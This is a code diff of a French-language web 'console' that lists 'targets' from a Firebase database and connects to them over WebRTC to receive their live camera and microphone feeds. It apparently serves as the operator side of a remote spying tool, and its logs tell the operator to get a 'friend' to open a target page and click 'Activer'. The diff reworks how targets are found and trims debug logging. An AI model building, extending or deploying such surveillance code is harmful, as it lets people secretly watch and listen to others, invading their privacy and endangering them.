@@ -187,61 +187,81 @@
             }
         }
 
+        // ===== FONCTION CORRIGÉE POUR CHARGER LES CIBLES =====
         function loadUsers() {
+            // Lire dans webrtc ET dans users
             const webrtcRef = ref(database, 'webrtc');
-            onValue(webrtcRef, (snapshot) => {
-                const webrtcData = snapshot.val();
+            const usersRef = ref(database, 'users');
+            
+            // Récupérer les deux sources
+            Promise.all([get(webrtcRef), get(usersRef)]).then(([webrtcSnapshot, usersSnapshot]) => {
+                const webrtcData = webrtcSnapshot.val() || {};
+                const usersData = usersSnapshot.val() || {};
                 const previousSelection = userSelect.value;
                 const now = Date.now();
                 
-                const activeLive = [];
-                const activeIdle = [];
+                const activeCibles = [];
+                const allIds = new Set();
                 
-                if (webrtcData) {
-                    Object.keys(webrtcData).forEach(userId => {
-                        const userData = webrtcData[userId];
-                        const hasOffer = userData.offer && userData.offer.sdp;
-                        const timestamp = userData.offer?.timestamp || 0;
-                        const isRecent = (now - timestamp) < 30000;
-                        
-                        if (hasOffer && isRecent) {
-                            activeLive.push({ id: userId, timestamp: timestamp });
-                        } else if (hasOffer) {
-                            activeIdle.push({ id: userId, timestamp: timestamp });
+                // 1. Ajouter les cibles de webrtc
+                Object.keys(webrtcData).forEach(userId => {
+                    const userData = webrtcData[userId];
+                    const hasOffer = userData.offer && userData.offer.sdp;
+                    const timestamp = userData.offer?.timestamp || 0;
+                    const isRecent = (now - timestamp) < 60000; // 60 secondes
+                    
+                    if (hasOffer && isRecent) {
+                        allIds.add(userId);
+                        activeCibles.push({ 
+                            id: userId, 
+                            type: 'webrtc',
+                            timestamp: timestamp,
+                            isActive: true
+                        });
+                    }
+                });
+                
+                // 2. Ajouter les utilisateurs de users qui ont une offre webrtc
+                Object.keys(usersData).forEach(userId => {
+                    // Vérifier si cet utilisateur a aussi une offre webrtc
+                    if (webrtcData[userId]?.offer?.sdp) {
+                        if (!allIds.has(userId)) {
+                            allIds.add(userId);
+                            activeCibles.push({ 
+                                id: userId, 
+                                type: 'user',
+                                isActive: true
+                            });
                         }
-                    });
-                }
+                    }
+                });
                 
+                // 3. Construire la liste déroulante
                 let selectHTML = '<option value="">-- Choisir une cible --</option>';
                 
-                if (activeLive.length > 0) {
-                    selectHTML += `<optgroup label="🟢 EN DIRECT (AUDIO+VIDEO)">`;
-                    activeLive.forEach(user => {
-                        const isSelected = (user.id === previousSelection) ? 'selected' : '';
-                        selectHTML += `<option value="${user.id}" ${isSelected}>🟢 [LIVE] Cible #${user.id} 🎤🎥</option>`;
+                if (activeCibles.length > 0) {
+                    selectHTML += `<optgroup label="🟢 CIBLES ACTIVES (${activeCibles.length})">`;
+                    activeCibles.forEach(cible => {
+                        const isSelected = (cible.id === previousSelection) ? 'selected' : '';
+                        // Tronquer l'ID pour l'affichage
+                        const shortId = cible.id.length > 20 ? cible.id.substring(0, 15) + '...' : cible.id;
+                        selectHTML += `<option value="${cible.id}" ${isSelected}>🟢 ${shortId} 🎤🎥</option>`;
                     });
                     selectHTML += `</optgroup>`;
-                }
-                
-                if (activeIdle.length > 0) {
-                    selectHTML += `<optgroup label="🟡 EN ATTENTE">`;
-                    activeIdle.forEach(user => {
-                        const isSelected = (user.id === previousSelection) ? 'selected' : '';
-                        selectHTML += `<option value="${user.id}" ${isSelected}>🟡 [ATTENTE] Cible #${user.id}</option>`;
-                    });
-                    selectHTML += `</optgroup>`;
-                }
-                
-                if (activeLive.length === 0 && activeIdle.length === 0) {
+                } else {
                     selectHTML = '<option value="">-- Aucune cible détectée --</option>';
+                    addLog("📡 Aucune cible active. Assurez-vous que votre ami a ouvert la page cible et cliqué sur 'Activer'.");
                 }
                 
                 userSelect.innerHTML = selectHTML;
                 
-                // Debug: Afficher la valeur sélectionnée
-                if (userSelect.value) {
-                    console.log("✅ Cible sélectionnée:", userSelect.value);
+                if (activeCibles.length > 0) {
+                    addLog(`✅ ${activeCibles.length} cible(s) active(s) détectée(s)`);
                 }
+                
+            }).catch(error => {
+                console.error("Erreur chargement:", error);
+                addLog(`❌ Erreur Firebase: ${error.message}`);
             });
         }
 
@@ -293,7 +313,6 @@
         }
 
         async function connectToUser() {
-            // Récupérer l'ID sélectionné correctement
             currentUserId = userSelect.value;
             
             addLog(`🔍 Tentative de connexion - ID sélectionné: "${currentUserId}"`);
@@ -304,7 +323,6 @@
                 return;
             }
 
-            // Nettoyer l'ancienne connexion
             if (peerConnection) {
                 disconnect();
             }
@@ -316,7 +334,6 @@
             addLog(`🔍 Connexion à la cible #${currentUserId}...`);
 
             try {
-                // Vérifier que l'offre existe
                 const offerRef = ref(database, `webrtc/${currentUserId}/offer`);
                 const offerSnapshot = await get(offerRef);
                 const offer = offerSnapshot.val();
@@ -341,7 +358,7 @@
                     if (peerConnection.connectionState === 'connected') {
                         setSystemStatus("🔴 EN DIRECT", "live");
                         fullscreenBtn.disabled = false;
-                        addLog("🎉 CONNEXION ÉTABLIE ! Flux vidéo + audio actif");
+                        addLog("🎉 CONNEXION ÉTABLIE !");
                     }
                     if (peerConnection.connectionState === 'failed') {
                         addLog("❌ Connexion échouée");
@@ -350,14 +367,13 @@
                 };
 
                 peerConnection.ontrack = (event) => {
-                    addLog(`📡 Track reçue: ${event.track.kind} - ${event.track.label || 'sans label'}`);
+                    addLog(`📡 Track reçue: ${event.track.kind}`);
                     
                     if (event.track.kind === 'video') {
                         placeholderText.style.display = 'none';
                         remoteVideo.style.display = 'block';
                     }
                     
-                    // Gérer le stream
                     if (remoteVideo.srcObject) {
                         const stream = remoteVideo.srcObject;
                         stream.addTrack(event.track);
@@ -368,7 +384,7 @@
                     if (event.track.kind === 'audio') {
                         const badge = document.getElementById('audioStatusBadge');
                         badge.style.display = 'flex';
-                        addLog("🔊 MICROPHONE DÉTECTÉ ! Cliquez sur 'Activer Audio' pour écouter");
+                        addLog("🔊 MICROPHONE DÉTECTÉ !");
                         toggleAudioBtn.disabled = false;
                         if (event.streams[0]) {
                             setupVolumeMeter(event.streams[0]);
@@ -380,25 +396,17 @@
                     if (event.candidate) {
                         const candidateRef = ref(database, `webrtc/${currentUserId}/admin-candidates`);
                         push(candidateRef, event.candidate.toJSON());
-                        addLog(`📤 ICE candidate envoyé`);
                     }
                 };
 
-                peerConnection.oniceconnectionstatechange = () => {
-                    addLog(`ICE état: ${peerConnection.iceConnectionState}`);
-                };
-
-                // Appliquer l'offre
                 await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                 addLog("✅ Offre SDP appliquée");
 
-                // Ajouter les candidats en attente
                 while (candidateQueue.length > 0) {
                     const candidate = candidateQueue.shift();
                     await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
                 }
 
-                // Créer et envoyer la réponse
                 const answer = await peerConnection.createAnswer();
                 await peerConnection.setLocalDescription(answer);
                 
@@ -410,7 +418,6 @@
                 });
                 addLog("📤 Réponse SDP envoyée");
 
-                // Écouter les candidats de l'utilisateur
                 const userCandidatesRef = ref(database, `webrtc/${currentUserId}/candidates`);
                 candidatesListenerRef = onValue(userCandidatesRef, (snapshot) => {
                     const candidates = snapshot.val();
@@ -426,7 +433,7 @@
                 });
 
                 loadUserInfo(currentUserId);
-                addLog(`🎯 Connecté à ${currentUserId} - En attente du flux...`);
+                addLog(`🎯 Connecté à ${currentUserId}`);
 
             } catch (err) {
                 addLog(`❌ Erreur: ${err.message}`);
@@ -436,7 +443,7 @@
         }
 
         function disconnect() {
-            addLog(`🔌 Déconnexion en cours...`);
+            addLog(`🔌 Déconnexion...`);
             
             if (volumeInterval) clearInterval(volumeInterval);
             if (audioContext) {
@@ -485,7 +492,7 @@
             metaState.innerText = "INACTIF";
             setSystemStatus("🔌 Déconnecté", "idle");
             
-            addLog(`🔌 Déconnecté de ${currentUserId || 'aucune cible'}`);
+            addLog(`🔌 Déconnecté`);
             currentUserId = null;
         }
 
@@ -496,7 +503,7 @@
                 remoteVideo.muted = false;
                 toggleAudioBtn.innerText = "🔇 Couper Audio";
                 toggleAudioBtn.classList.replace('bg-emerald-800', 'bg-red-800');
-                addLog("🔊 AUDIO ACTIVÉ - Vous entendez le microphone de la cible");
+                addLog("🔊 AUDIO ACTIVÉ");
             } else {
                 remoteVideo.muted = true;
                 toggleAudioBtn.innerText = "🔊 Activer Audio";
@@ -513,10 +520,7 @@
             }
         }
 
-        // Événements
         connectBtn.addEventListener('click', () => {
-            const selected = userSelect.value;
-            addLog(`🔘 Bouton connecter cliqué - Valeur sélectionnée: "${selected}"`);
             connectToUser();
         });
         
@@ -524,9 +528,7 @@
         disconnectBtn.addEventListener('click', disconnect);
         fullscreenBtn.addEventListener('click', toggleFullscreen);
         
-        // Quand la sélection change, déconnecter automatiquement
         userSelect.addEventListener('change', () => {
-            addLog(`📋 Changement de sélection: ${userSelect.value}`);
             if (peerConnection) {
                 disconnect();
             }
@@ -537,6 +539,7 @@
         setInterval(loadUsers, 3000);
         
         addLog("✅ Console prête - En attente de cibles...");
+        addLog("💡 Votre ami doit ouvrir la page cible et cliquer sur 'Activer'");
     </script>
 </body>
 </html>
